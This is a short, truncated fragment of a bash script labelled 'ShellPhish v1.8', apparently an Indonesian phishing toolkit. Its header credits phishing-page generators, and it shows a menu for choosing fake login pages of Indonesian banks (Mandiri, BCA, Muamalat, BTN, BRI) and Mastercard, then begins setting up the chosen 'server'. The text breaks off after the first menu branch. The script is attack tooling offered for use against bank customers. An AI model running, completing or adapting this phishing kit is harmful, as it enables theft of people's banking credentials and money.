#!/bin/bash
# ShellPhish v1.8
# Coded by: termux_choice (You dont become a coder by just changing the credits)
# Github:  https://github.com/HAMBALI251298/Kapten-Oleng/blob/main/MENGAMBIL.sh
# This script uses some Phishing Pages generated by SocialFish tool (UndeadSec) (https://github.com/HAMBALI251298/SocialFish)
# Bank Phishing Page generated by An0nUD4Y (https://github.com/HAMBALI251298) 
...
echo '2.BANK MANDIRI' | lolcat
echo '3.BANK BCA' | lolcat
echo '4.BANK MUAMALAT' | lolcat
echo '5.BANK BTN' | lolcat
echo '6.BANK BRI' | lolcat


read -p 'Pilih Mana Sahabat : ' pil; 
 

  if [ $pil = '1' ]
  then
cd $HOME
server="BANK Mastercard"
